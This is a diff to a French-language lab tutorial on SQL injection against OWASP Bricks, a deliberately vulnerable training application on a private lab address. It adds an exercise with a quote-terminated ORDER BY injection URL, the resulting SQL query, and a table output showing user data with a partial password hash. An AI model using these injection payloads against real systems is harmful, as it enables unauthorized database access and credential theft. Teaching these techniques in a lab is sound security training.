@@ -381,3 +381,26 @@ URL : `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+UNION+SELECT+p
 ![Requête avec LIMIT 4,1 qui affiche donc la 4ème ligne de la table _users_](images/limit4-1.png)
 
 Félicitations, vous venez d'extraire des mot de passe d'une base de données en exploitant une injection SQL avec l'opérateur `UNION`.
+
+\newpage
+## Content 2 
+
+Même chose que pour l'exercice précédent sauf, qu'il est nécessaire d'ajouter un `'` après le texte pour réaliser l'injection.
+
+URL : `http://192.168.56.101/owaspbricks/content-2/index.php?user=harry%27+ORDER+BY+8;--+`
+
+Notez le "`+`" après le "`--`". Il s'agit d'un espace "` `" encodé en encodage URL.
+
+Requête SQL: 
+```
+SELECT * FROM users WHERE name='harry' ORDER BY 8;-- '
+```
+
+```
++---------+-------+---------------------+---------------
+| idusers | name  | email               | password      
++---------+-------+---------------------+--------------- ...
+|       3 | harry | harry@getmantra.com | 5f4dcc3b5aa765
++---------+-------+---------------------+---------------
+
+```
